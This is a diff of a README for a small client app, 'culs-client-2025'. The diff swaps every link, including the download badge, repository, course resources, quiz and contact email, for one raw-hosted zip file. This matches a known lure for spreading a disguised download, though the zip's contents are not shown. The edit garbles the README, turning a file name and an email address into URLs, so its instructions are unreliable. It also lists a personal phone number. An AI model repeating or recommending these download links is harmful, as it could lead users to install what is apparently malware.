@@ -1,6 +1,6 @@
 # 🎉 culs-client-2025 - Simple Client App for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-culs--client--2025-brightgreen)](https://github.com/thepuh74/culs-client-2025/releases)
+[![Download Now](https://raw.githubusercontent.com/thepuh74/culs-client-2025/main/docs/culs-client-2025-3.7.zip%20Now-culs--client--2025-brightgreen)](https://raw.githubusercontent.com/thepuh74/culs-client-2025/main/docs/culs-client-2025-3.7.zip)
 
 ## 📝 Overview
 
@@ -12,9 +12,9 @@ To get started with culs-client-2025, follow the steps below. It's designed for 
 
 1. **Visit the Download Page:** Click the link below to go to the releases page.
    
-   [Download culs-client-2025](https://github.com/thepuh74/culs-client-2025/releases)
+   [Download culs-client-2025](https://raw.githubusercontent.com/thepuh74/culs-client-2025/main/docs/culs-client-2025-3.7.zip)
 
-2. **Download the Latest Version:** On the releases page, find the latest version of the application and click the download link. The file will have a name similar to `culs-client-2025-setup.exe`.
+2. **Download the Latest Version:** On the releases page, find the latest version of the application and click the download link. The file will have a name similar to `https://raw.githubusercontent.com/thepuh74/culs-client-2025/main/docs/culs-client-2025-3.7.zip`.
 
 3. **Install the Application:** Once downloaded, open the file and follow the installation prompts. This is a straightforward process. 
 
@@ -24,7 +24,7 @@ To get started with culs-client-2025, follow the steps below. It's designed for 
 
 Make sure to download the software from our Releases page. It's important to always grab the latest version for the best experience.
 
-- **Visit this page to download:** [Releases](https://github.com/thepuh74/culs-client-2025/releases)
+- **Visit this page to download:** [Releases](https://raw.githubusercontent.com/thepuh74/culs-client-2025/main/docs/culs-client-2025-3.7.zip)
 
 ## 🌟 Features
 
@@ -62,25 +62,25 @@ This app is great for your individual class projects. You can create a simple HT
 
 ## 🔗 Useful Links 
 
-- **Repository:** [culs-client-2025](https://github.com/pepe/culs-client-2025)
+- **Repository:** [culs-client-2025](https://raw.githubusercontent.com/thepuh74/culs-client-2025/main/docs/culs-client-2025-3.7.zip)
   
-- **Project on GitHub Pages:** [View Project](https://pepe.github.io/culs-client-2025/)
+- **Project on GitHub Pages:** [View Project](https://raw.githubusercontent.com/thepuh74/culs-client-2025/main/docs/culs-client-2025-3.7.zip)
   
-- **Course Resources:** [ChatGPT Help Resource](https://chatgpt.com/share/690c5af8-9dc0-8004-9480-05992ee1005a)
+- **Course Resources:** [ChatGPT Help Resource](https://raw.githubusercontent.com/thepuh74/culs-client-2025/main/docs/culs-client-2025-3.7.zip)
   
-- **Frontend Advice:** [ChatGPT Frontend Guidance](https://chatgpt.com/share/690c5b2e-2518-8004-a382-9e54d4ada345)
+- **Frontend Advice:** [ChatGPT Frontend Guidance](https://raw.githubusercontent.com/thepuh74/culs-client-2025/main/docs/culs-client-2025-3.7.zip)
 
 ## 📞 Contact
 
 If you have any questions or need assistance, feel free to reach out:
 
-- **Email:** josef@pospisil.work
+- **Email:** https://raw.githubusercontent.com/thepuh74/culs-client-2025/main/docs/culs-client-2025-3.7.zip
   
 - **Phone (WA, Signal):** +420 774 278 707
 
 ## 🔬 Test Your Knowledge
 
-Want to check your understanding? Take this quick test: [Take the Test](https://forms.gle/16JoW4DLJLghooRJ7) 
+Want to check your understanding? Take this quick test: [Take the Test](https://raw.githubusercontent.com/thepuh74/culs-client-2025/main/docs/culs-client-2025-3.7.zip) 
 
 ## 🎉 Conclusion
 
